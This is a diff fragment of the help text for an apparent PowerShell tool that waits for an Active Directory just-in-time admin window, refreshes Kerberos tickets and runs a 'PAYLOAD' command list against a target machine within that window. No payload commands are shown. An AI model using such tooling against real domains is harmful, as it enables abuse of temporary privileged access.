+  -Mode Refresh   refresh the authentication state: klist purge -> gpupdate /force -> new logon to get a new token -> re-check
+  -Mode Wait      poll and wait for the window (-DeadlineSec); on entry refresh tickets, run -CommandFile, count down and check the residual token
+  -Mode Run       assume you are already inside the window: refresh -> re-check -> run the planned command list within -WindowSec seconds
 
-  -Domain DOMAIN        AD domain name      -User USER      will be JIT Authorized account
-  -Group 'JIT-Admins'   High power group name     -Computer TARGET target machine
-  -CommandFile PAYLOAD  List of established commands in the window (one per line，# Start with a comment）
-  -WindowSec 300        Time budget for actions within the window    -DeadlineSec 1800  Wait Total mode polling time
+  -Domain DOMAIN        AD domain name      -User USER      account that will be JIT-authorized
+  -Group 'JIT-Admins'   privileged group name     -Computer TARGET target machine
+  -CommandFile PAYLOAD  planned in-window command list (one per line, # starts a comment)
+  -WindowSec 300        time budget for in-window actions    -DeadlineSec 1800  total polling time for Wait mode
 '@
     exit 0
 }
